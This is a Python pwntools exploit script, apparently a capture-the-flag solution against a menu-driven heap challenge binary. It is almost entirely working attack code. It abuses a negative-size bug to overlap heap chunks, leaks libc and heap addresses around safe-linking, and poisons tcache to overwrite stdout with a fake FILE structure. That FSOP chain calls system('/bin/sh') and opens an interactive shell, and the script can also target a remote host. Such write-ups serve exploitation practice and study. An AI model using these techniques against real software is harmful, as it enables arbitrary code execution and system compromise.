#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from setcontext32 import *

exe = context.binary = ELF('k3ndr1ck_library')
libc = ELF("./libc.so.6")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def add_track(size, data):
    io.sendlineafter(b":", b"1")
    io.sendlineafter(b":", str(size).encode())
    io.sendlineafter(b":", data)

def remove_track(idx):
    io.sendlineafter(b":", b"2")
    io.sendlineafter(b":", str(idx).encode())

def edit_track(idx, data):
    io.sendlineafter(b":", b"3")
    io.sendlineafter(b":", str(idx).encode())
    io.sendlineafter(b":", data)

def view_track(idx):
    io.sendlineafter(b":", b"4")
    io.sendlineafter(b":", str(idx).encode())
    io.recvuntil(b":")
    data = io.recv(0x430)
    return data

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val


def solve():

    """
    Info leaks
    - Libc from unsorted bin
    - Heap from tcache bin (bypass safelinking)
    """

    size = -negate(0x500, 16)

    add_track(size, b"chunkA")
    add_track(0x10, b"chunkB")

    """
    At this point track[0] == track[2], so we free track[2] to place in tcache and view track[0] to get both heap & libc leak
    """

    size = -negate(0x400, 16)
    remove_track(0)
    add_track(size, b"chunkC")
    add_track(size, b"chunkD")
    remove_track(2)

    leak = view_track(0).split(b"\x00")
    leak = [i for i in leak if len(i) != 0]
    heap_base = u64(leak[0][1:].ljust(8, b"\x00")) << 12
    main_arena = u64(leak[-1].ljust(8, b"\x00")) - 0x60
    libc.address = main_arena - libc.sym["main_arena"]
    info("libc base: %#x", libc.address)
    info("heap base: %#x", heap_base)

    """
    Tcache poisoning -> FSOP
    """

    remove_track(3)
    edit_track(3, p64(mangle(heap_base, libc.sym._IO_2_1_stdout_,)))

    stdout_lock = libc.sym._IO_stdfile_1_lock
    stdout = libc.sym['_IO_2_1_stdout_']
    fake_vtable = libc.sym['_IO_wfile_jumps'] - 0x18
    gadget = libc.address + 0x1484a0 # add rdi, 0x10 ; jmp rcx

    fake = FileStructure(0)
    fake.flags = 0x3b01010101010101
    fake._IO_read_end = libc.sym['system']
    fake._IO_save_base = gadget
    fake._IO_write_end = u64(b'/bin/sh\x00')
    fake._lock = stdout_lock
    fake._codecvt= stdout + 0xb8
    fake._wide_data = stdout+0x200
    fake.unknown2 = p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

    print(len(bytes(fake)))
    fake_fp = add_track(size, bytes(fake))


    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

